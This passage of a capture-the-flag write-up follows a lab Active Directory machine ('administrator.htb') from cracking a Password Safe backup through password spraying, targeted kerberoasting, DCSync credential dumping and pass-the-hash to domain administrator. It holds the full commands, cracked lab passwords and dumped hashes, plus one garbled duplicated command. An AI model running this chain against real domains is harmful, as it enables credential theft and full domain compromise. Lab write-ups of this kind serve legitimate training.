Candidates.#01...: qwert123 -> imi123  
Hardware.Mon.#01.: Temp: 72c Util: 82%  
  
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>
```

It takes too long, so we try it straight without rules :

```bash
>  hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Single-Hash  
* Single-Salt  
* Slow-Hash-SIMD-LOOP  
  
ATTENTION! Potfile storage is disabled for this hash mode.  
Passwords cracked during this session will NOT be stored to the potfile.  
Consider using -o to save cracked passwords.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (12733 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
Backup.psafe3:tekieromucho                                   
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 5200 (Password Safe v3)  
Hash.Target......: Backup.psafe3  
Time.Started.....: Wed Jun  3 18:43:01 2026 (1 sec)  
Time.Estimated...: Wed Jun  3 18:43:02 2026 (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:     6399 H/s (12.54ms) @ Accel:32 Loops:1024 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 4864/14344384 (0.03%)  
Rejected.........: 0/4864 (0.00%)  
Restore.Point....: 4608/14344384 (0.03%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:2048-2049  
Candidate.Engine.: Device Generator  
Candidates.#01...: terminator -> daryl  
Hardware.Mon.#01.: Temp: 71c Util: 47%  
  
Started: Wed Jun  3 18:42:59 2026  
Stopped: Wed Jun  3 18:43:03 2026
```

`Backup.psafe3:tekieromucho`

We then decrypt the backup with its master password and get :

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw  # Alexander Smith  
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur  # Emma Johnson  
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb  # Emily Rodriguez`
```

So we built two separate files :

```nano
 GNU nano 9.0                                                                                         pass.txt                                                                                         Modified     
UrkIbagoxMyUGw0aPlj9B0AXSea4Sw                      
WwANQWnmJnGV07WQN8bMS7FMAbjNur                   
UXLCI5iETUsIBoFVTj8yQFKoHjXmb

 GNU nano 9.0                                                                                         users.txt 
emma  
alexander  
emily
```

Then we spray :

```bash
>  nxc winrm 10.129.12.40 -u users.txt -p pass.txt --continue-on-success  
WINRM       10.129.12.40    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)    
WINRM       10.129.12.40    5985   DC               [-] administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw  
WINRM       10.129.12.40    5985   DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw  
WINRM       10.129.12.40    5985   DC               [-] administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw  
WINRM       10.129.12.40    5985   DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur  
WINRM       10.129.12.40    5985   DC               [-] administrator.htb\alexander:WwANQWnmJnGV07WQN8bMS7FMAbjNur  
WINRM       10.129.12.40    5985   DC               [-] administrator.htb\emily:WwANQWnmJnGV07WQN8bMS7FMAbjNur  
WINRM       10.129.12.40    5985   DC               [-] administrator.htb\emma:UXLCI5iETUsIBoFVTj8yQFKoHjXmb  
WINRM       10.129.12.40    5985   DC               [-] administrator.htb\alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb  
WINRM       10.129.12.40    5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
```

And we got a shell on `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`.
This must be foothold.

```PowerShell
>  evil-winrm -i 10.129.12.40 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\emily\Documents> cd /Users/emily/Desktop  
*Evil-WinRM* PS C:\Users\emily\Desktop> ls  
  
  
   Directory: C:\Users\emily\Desktop  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk  
-ar---          6/3/2026   3:44 PM             34 user.txt  
  
  
*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt  
90e524*************3db793
```

And it is.

```PowerShell
*Evil-WinRM* PS C:\Users\emily\Desktop> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
*Evil-WinRM* PS C:\Users\emily\Desktop> whoami /groups  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                  Type             SID          Attributes  
=========================================== ================ ============ ==================================================  
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448  
*Evil-WinRM* PS C:\Users\emily\Desktop>
```

Nothing special, so we open `bloodhound` again to check on `emily`'s privileges.

She has `GenericWrite` on `ethan`.

We need to adjust the time to the machine before kerberoasting.

```bash
>  nmap -p445 --script smb2-time -Pn 10.129.12.40  
  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-03 19:30 +0200  
Nmap scan report for administrator.htb (10.129.12.40)  
Host is up (0.047s latency).  
  
PORT    STATE SERVICE  
445/tcp open  microsoft-ds  
  
Host script results:  
| smb2-time:    
|   date: 2026-06-04T00:30:09  
|_  start_date: N/A
```

We see it's `00:30` (UTC) so we set the time and request a hash :

```bash
>  sudo timedatectl set-ntp false  
sudo date -u -s '2026-06-04 00:30:09'  
date -u  
Thu Jun  4 12:30:09 AM UTC 2026  
Thu Jun  4 12:30:09 AM UTC 2026  
>  targetedkerberoast --dc-ip 10.129.12.40 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --request-user ethan -o ethan.hash -v  
  
[*] Starting kerberoast attacks  
[*] Attacking user (ethan)  
[VERBOSE] SPN added successfully for (ethan)  
[+] Writing hash to file for (ethan)  
[VERBOSE] SPN removed successfully for (ethan)
```

Then, we crack the hash we requested using `Kerberos TGS etype 23` mode for hashcat which is `13100` : and we get a

```bash
>  hashcat -a 0 -m 13100 ethan.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (15208 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$47b617cacb26fe6352b093828f4dfa82$b1ede0a6b28378a14927940052db4959d1f89ffd68ab027d4e2c26daa44f5973dd8e26c52b4d766821c216a7bf6c8a7528adbfcd6e39018c0d0  
9f9fa16ed39a2467b12a4f188c4703ca661bdc41d18f2c0f6218165dae7a83e11c5ffda68e153470e0b2a1a7c3ea20cc251ae1cb4020640a54a75bc4e3caa878948cb2fb7f66ba474eaeb76a5e59a5e682f136dd9096d8e87370c44c4706694fd4d81cd8a99ef195fb  
182de4e368b14b4d36a7d13f77f4cff440b22d234922defa2793ecc9fcf5695ff51ccbfdb83d69bb473b514823bc6fe7b9a821eba656e99d34edfac8d27f9a121d388002b44afbe38f333551a62afbce61a68d1426bebb460a125961810a7cd6889240c42c4b8b5d72  
ee64a29e4e71c704e4dea2bbcb8daf4e873775157db2c6679437661f994792ad80ca928c5e9a0cd4e852cafa0dfc2e6a01f556e7aec3cb12df8edba6bf792dcb4c0640e14dd3a5e42eaad8f162145afd4379186f9e3fdd93cb7a01ff63614dde5f7fd81a18bb32738b  
366114308684d6df6f3fa567db6e0453a581c6dcb1009310b03f0d50cdd574f4e97b60a0d16367694a21231b0003fae4ff5127adc360ce420918f601af8beb31818374850ddd062b88bfd7955f9f57836544df1ab3e9e7db455522d894d238efa24adb9b4985b79414  
5bdffcbadc227768cd700a07c89898dba19ba7c8b1830f4c6af4fcd5100c640129fa2e6abe235ff6bb7279b6d7e9b94caa2d0b6aafab2ddbbc89f45a379d6c106c4407fc8469a91797c2acd198d47a1c35d899243dba00df576b75553149250f96cf3459311c441370  
d1a11ac8ca7359810c08c3c89ca9e2d13bcfc41ad32c248165a81f7233c0dfbdfff3f1d64b8c2be9359522a81215d5eaf95f4f53626388b2e0f5583e371732c705c2033aaf999ead598418f1c5c1062c1cbe0a3ea469f2cef2fcdf3318feec24a5622893f4b6315685  
0e723cbc5b7c6a28bbe9f08642cef0a84d1152dbf9dccd1b0be4deefe426ca7bf95c25bd02bacee574a6081b36d81e3e19352ee0ce3f615c24d39222dce07cb1ba9fe010d3f268a7f133cb8677afdbce464f98576e5c008a2e7c33891096bc05ed1fbb788c6823a2b7  
9e6e3c0a24015263a9fd870b88da8d46f7d36fdf5c64e999d110a4c4ac128545c0f2920b1f09e2e85f188544073ef4c838dc835fd77a4814b7c72b1e40f4dbf11708c7c107da349d5710e33f6bcf9e901986a6568b6ce57d35f09b051388221f9ae312d40f879f61f6  
5b8734b5eaf1e7862c8f1b67afcdcb2f35de15ee6852f245f24a681ec05062c078224de187ceb423ecb80ae891d48b14b3338b11cd70a6eb15578c663fc3cb29137224af08356f531c4210b1e8f68495f859b72d487fa568844356bb9c077880a0c40f5da1928f9c50  
3a07f858bc85fc8ccbd3704be727b71c50806d392cc4027868042b1b6e8e48a7402baf466549cd10f0dce206bfbd45d2cbbd886657be3bfdd1c74e92a2b60ea86548ff93fc29832a2cf60833305e6646a07abee56:limpbizkit  
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)  
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....abee56  
Time.Started.....: Thu Jun  4 02:32:01 2026 (0 secs)  
Time.Estimated...: Thu Jun  4 02:32:01 2026 (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:  1015.6 kH/s (4.88ms) @ Accel:1024 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 8192/14344384 (0.06%)  
Rejected.........: 0/8192 (0.00%)  
Restore.Point....: 0/14344384 (0.00%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#01...: 123456 -> total90  
Hardware.Mon.#01.: Temp: 71c Util: 35%  
  
Started: Thu Jun  4 02:31:59 2026  
Stopped: Thu Jun  4 02:32:03 2026
```

`limpbizkit` it is.

```bash
>  nxc smb 10.129.12.40 -u ethan -p 'limpbizkit' --shares  
  
SMB         10.129.12.40    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.12.40    445    DC               [+] administrator.htb\ethan:limpbizkit    
SMB         10.129.12.40    445    DC               [*] Enumerated shares  
SMB         10.129.12.40    445    DC               Share           Permissions     Remark  
SMB         10.129.12.40    445    DC               -----           -----------     ------  
SMB         10.129.12.40    445    DC               ADMIN$                          Remote Admin  
SMB         10.129.12.40    445    DC               C$                              Default share  
SMB         10.129.12.40    445    DC               IPC$            READ            Remote IPC  
SMB         10.129.12.40    445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.12.40    445    DC               SYSVOL          READ            Logon server share    
>  nxc winrm 10.129.12.40 -u ethan -p 'limpbizkit'  
WINRM       10.129.12.40    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)    
WINRM       10.129.12.40    5985   DC               [-] administrator.htb\ethan:limpbizkit
```

So we have the same rights as everyone else on smb but no shell. Maybe we can access a private directory, but first we'll check ethan's privileges on `bloodhound`.

We got nothing on `bloodhound`, the only privilege is towards `emily`.

```bash
>  smbclient //10.129.12.40/SYSVOL -U ethan%limpbizkit  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Fri Oct  4 21:48:08 2024  
 ..                                  D        0  Fri Oct  4 21:48:08 2024  
 administrator.htb                  Dr        0  Fri Oct  4 21:48:08 2024
smb: \> cd administrator.htb  
smb: \administrator.htb\> ls  
 .                                   D        0  Fri Oct  4 21:54:15 2024  
 ..                                  D        0  Fri Oct  4 21:48:08 2024  
 DfsrPrivate                      DHSr        0  Fri Oct  4 21:54:15 2024  
 Policies                            D        0  Fri Oct  4 21:48:32 2024  
 scripts                             D        0  Fri Oct  4 21:48:08 2024  
  
               5606911 blocks of size 4096. 2075101 blocks available  
smb: \administrator.htb\> cd DfsrPrivate  
cd \administrator.htb\DfsrPrivate\: NT_STATUS_ACCESS_DENIED
```

And we don't.

Our only way is to get a new database for bloodhound from `ethan` and hope we find a privilege.

```bash
>  bloodhound-python -d administrator.htb -c All -u ethan -p 'limpbizkit' -ns 10.129.12.40 --zip  
  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: administrator.htb  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: dc.administrator.htb  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc.administrator.htb  
INFO: Found 11 users  
INFO: Found 53 groups  
INFO: Found 2 gpos  
INFO: Found 1 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: dc.administrator.htb  
INFO: Done in 00M 27S  
INFO: Compressing output into 20260604024553_bloodhound.zip
```

After erasing the old database and putting in the new one, we can see we have four outbound rights towards `administrator` : `GetChanges, GetChangesAll, GetChangesInFilteredSet and DCsync`.

Time to use Impacket and get that sweet NT:LM Administrator hash, hopefully :

```bash
>  secretsdump.py -just-dc administrator.htb/ethan@10.129.12.40  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
Password:  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::  
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::  
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:4d3aa5fca989c0334ba7e2f48e26f79b:::  
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:4d3aa5fca989c0334ba7e2f48e26f79b:::  
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::  
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::  
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::  
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::  
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::  
[*] Kerberos keys grabbed  
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664  
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2  
Administrator:des-cbc-md5:403286f7cdf18385  
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648  
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94  
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7  
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3  
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48  
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9  
administrator.htb\michael:aes256-cts-hmac-sha1-96:e9337a2048fa0adeddb613a9c2d14caeb9ec9e92e671d9826f55dad6d9246f5c  
administrator.htb\michael:aes128-cts-hmac-sha1-96:0f09c39092307b75ccb7f8431891b58b  
administrator.htb\michael:des-cbc-md5:d09e45d38abf0207  
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:4651f47cc6ae4c7566ba6fa9878584cde0b359849d8dee8b887313d6586891bc  
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:3eeab8b2684736d8e0acddc68dae0211  
administrator.htb\benjamin:des-cbc-md5:bf029b86cb515d7a  
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4  
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218  
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51  
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f  
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f  
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb  
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6  
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade  
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf  
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82  
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e  
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d  
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb  
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d  
DC$:des-cbc-md5:f483547c4325492a  
[*] Cleaning up...
```

And we got it ! `aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e`

We can just use Pass-The-Hash with the actual useful portion, `3dc533..` :

```bash
>  nxc winrm 10.129.12.40 -u Administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"  
WINRM       10.129.12.40    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)    
WINRM       10.129.12.40    5985   DC               [+] administrator.htb\Administrator:3dc553ce4b9fd20bd016e098d2d2fd2e (Pwn3d!)
```

Gotcha.

```PowerShell
>  nxc winrm 10.129.12.40 -u Administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"  
WINRM       10.129.12.40    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)    
WINRM       10.129.12.40    5985   DC               [+] administrator.htb\Administrator:3dc553ce4b9fd20bd016e098d2d2fd2e (Pwn3d!)  
>  evil-winrm -i 10.129.12.40 -u Administrator -H ">  nxc winrm 10.129.12.40 -u Administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"  
WINRM       10.129.12.40    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)    
WINRM       10.129.12.40    5985   DC               [+] administrator.htb\Administrator:3dc553ce4b9fd20bd016e098d2d2fd2e (Pwn3d!)  
  
>  evil-winrm -i 10.129.12.40 -u Administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"

/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:/Users/Administrator/Desktop/root.txt  
6467**********9d8688465298
```

And we got root.

Now, we reset the clock to get back to the actual real-world time of where the fuck I am (which I will not reveal for OpSec reasons) :

```bash
sudo timedatectl set-ntp true
```
